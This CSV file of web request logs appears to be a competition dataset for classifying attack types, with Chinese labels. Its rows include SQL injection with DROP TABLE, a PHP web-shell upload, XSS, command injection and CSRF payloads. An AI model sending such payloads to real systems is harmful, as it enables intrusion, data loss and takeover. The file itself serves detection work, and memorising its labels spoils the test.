row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
5930,2025-10-31 06:15:23,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.187.38.101,10.187.35.5,/apI/USERS,,正常访问,正常访问
5319,2025-10-26 15:37:07,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.251.193.190,10.210.184.38,/api/transfer,action%3Ddelete%26confirm%3Dtrue,CSRF攻击,CSRF攻击
8296,2025-11-04 10:18:52,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.110.39,10.187.76.46,/api/users,id=15'; DROP TABLE users0; --,SQL注入攻击,SQL注入攻击
9462,2025-11-15 07:45:51,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.88.111,10.187.20.133,/aDMiN/sEttingS&random=4855&test=825,setTing=DisaBLe_secuRity&value=truE&timestamp=1763343422&cache=true&timestamp=1763343422,CSRF攻击,CSRF攻击
2890,2025-10-21 14:15:32,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.22.131,10.251.98.17,/api/upload,"------WebKitFormBoundary483638
Content-Disposition: form-data; name=""file""; filename=""shell837.php""
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary790354--",文件上传攻击,文件上传攻击
10570,2025-11-01 15:51:38,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.248.76.63,10.244.155.144,"/products?id=992 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)&random=4954&timestamp=1763342384&debug=1",,SQL注入攻击,SQL注入攻击
5716,2025-11-13 22:38:04,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.24.243,10.110.192.6,/profile,q=<img src=x onerror=alert&#40;635&#41;>,XSS跨站脚本攻击,XSS跨站脚本攻击
10863,2025-10-25 00:54:46,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.244.10.233,10.251.110.241,/products,id=179 AND (SELECT LENGTH(user()))=18,SQL注入攻击,SQL注入攻击
7269,2025-10-24 04:35:40,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.19.209,10.253.177.28,/api/execute,target=127.0.0.1602|`id`,远程命令执行攻击,远程命令执行攻击
9553,2025-10-27 19:36:53,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.252.156.145,10.252.185.49,/message,comment=<script>alert('XSS886')</script>,XSS跨站脚本攻击,XSS跨站脚本攻击
6029,2025-10-18 20:18:38,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.156,10.251.248.103,/search,target=127.0.0.1115|id,远程命令执行攻击,远程命令执行攻击
6445,2025-10-27 00:33:19,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.10.89,10.110.116.201,/aDMiN/seTtings,eMAil=aTtacKEr65@examplE.cOM&role=AdmiN,CSRF攻击,CSRF攻击
1254,2025-11-08 08:47:13,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.108.208.231,10.253.251.82,/api/comment?q=<img src=x onerror=alert(558)>,,XSS跨站脚本攻击,XSS跨站脚本攻击
